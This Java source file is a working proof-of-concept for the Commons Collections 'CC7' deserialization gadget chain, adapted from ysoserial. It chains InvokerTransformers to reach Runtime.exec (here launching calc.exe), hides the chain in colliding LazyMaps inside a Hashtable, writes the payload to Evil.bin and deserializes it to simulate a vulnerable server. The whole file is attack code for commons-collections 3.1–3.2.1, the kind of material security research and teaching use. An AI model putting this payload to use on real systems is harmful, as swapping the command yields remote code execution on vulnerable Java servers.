package com.CommonsCollections;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;


/**
 * Gadget chain:
 *     java.util.Hashtable.readObject
 *     java.util.Hashtable.reconstitutionPut
 *     org.apache.commons.collections.map.AbstractMapDecorator.equals
 *     java.util.AbstractMap.equals
 *     org.apache.commons.collections.map.LazyMap.get
 *     org.apache.commons.collections.functors.ChainedTransformer.transform
 *     org.apache.commons.collections.functors.InvokerTransformer.transform
 *     java.lang.reflect.Method.invoke
 *     sun.reflect.DelegatingMethodAccessorImpl.invoke
 *     sun.reflect.NativeMethodAccessorImpl.invoke
 *     sun.reflect.NativeMethodAccessorImpl.invoke0
 *     java.lang.Runtime.exec
 *
 * 	Requires:
 * 		commons-collections:3.1-3.2.1
 * 	    JDK: 1.7 & 1.8
 *
 * 	Refer：
 * 	https://github.com/woodpecker-framework/ysoserial-for-woodpecker/blob/master/src/main/java/me/gv7/woodpecker/yso/payloads/CommonsCollections7.java
 */


public class CC7 {
    public static void main(String[] args) throws Exception {
        Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})};

        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();
        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
        lazyMap1.put("yy", 1);
        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
        lazyMap2.put("zZ", 1);

        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 2);

        Field field =transformerChain.getClass().getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(transformerChain,transformers);
        lazyMap2.remove("yy");

        //payload序列化写入文件
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("Evil.bin"));
        outputStream.writeObject(hashtable);
        outputStream.close();
        //服务端读取文件，反序列化，模拟网络传输
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("Evil.bin"));
        inputStream.readObject();
    }
}

